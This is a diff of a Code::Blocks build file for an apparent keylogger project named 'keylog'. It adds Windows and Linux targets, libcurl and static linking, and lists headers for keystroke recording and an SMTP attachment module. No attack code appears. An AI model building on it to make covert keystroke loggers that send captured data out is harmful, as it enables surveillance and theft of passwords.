@@ -5,25 +5,50 @@
 		<Option title="keylog" />
 		<Option pch_mode="2" />
 		<Option compiler="gcc" />
+		<Option virtualFolders="include\;" />
 		<Build>
-			<Target title="Release">
+			<Target title="release_windows">
+				<Option platforms="Windows;" />
 				<Option output="bin/keylog" prefix_auto="1" extension_auto="1" />
 				<Option object_output="obj" />
 				<Option type="1" />
 				<Option compiler="gcc" />
+				<Option use_console_runner="0" />
 				<Option projectLinkerOptionsRelation="2" />
 				<Compiler>
 					<Add option="-O2" />
-					<Add directory="include" />
+					<Add directory="C:/MinGW/msys/1.0/local/include" />
 				</Compiler>
 				<Linker>
 					<Add option="-s" />
+					<Add library="C:\MinGW\msys\1.0\local\lib\libcurl.dll.a" />
+					<Add directory="C:/MinGW/msys/1.0/local/include" />
+				</Linker>
+			</Target>
+			<Target title="release_linux">
+				<Option platforms="Unix;" />
+				<Option output="bin/keylog_linux" prefix_auto="1" extension_auto="1" />
+				<Option object_output="obj" />
+				<Option type="1" />
+				<Option compiler="gcc" />
+				<Option use_console_runner="0" />
+				<Option projectLinkerOptionsRelation="2" />
+				<Compiler>
+					<Add option="-O2" />
+				</Compiler>
+				<Linker>
+					<Add option="-s" />
+					<Add option="-lcurl" />
 				</Linker>
 			</Target>
 		</Build>
 		<Compiler>
 			<Add option="-Wall" />
+			<Add directory="include" />
 		</Compiler>
+		<Linker>
+			<Add option="-static" />
+		</Linker>
 		<Unit filename="include/keydb.h" />
 		<Unit filename="include/keylocks.h" />
 		<Unit filename="include/keyrecord.h" />
@@ -31,13 +56,25 @@
 		<Unit filename="include/keytime.h" />
 		<Unit filename="include/keytxt.h" />
 		<Unit filename="include/keyvalue.h" />
-		<Unit filename="include/linux_keyrecord.h" />
-		<Unit filename="include/linux_keystatus.h" />
-		<Unit filename="include/linux_keyvalue.h" />
+		<Unit filename="include/linux_keyrecord.h">
+			<Option target="release_linux" />
+		</Unit>
+		<Unit filename="include/linux_keystatus.h">
+			<Option target="release_linux" />
+		</Unit>
+		<Unit filename="include/linux_keyvalue.h">
+			<Option target="release_linux" />
+		</Unit>
 		<Unit filename="include/smtp_attach.h" />
 		<Unit filename="include/string_keystatus.h" />
 		<Unit filename="include/string_keyvalue.h" />
 		<Unit filename="include/util.h" />
+		<Unit filename="include/windows_keyrecord.h">
+			<Option target="release_windows" />
+		</Unit>
+		<Unit filename="include/windows_keyvalue.h">
+			<Option target="release_windows" />
+		</Unit>
 		<Unit filename="src/keylog.cpp" />
 		<Unit filename="src/keyrecord.cpp" />
 		<Unit filename="src/keytxt.cpp" />
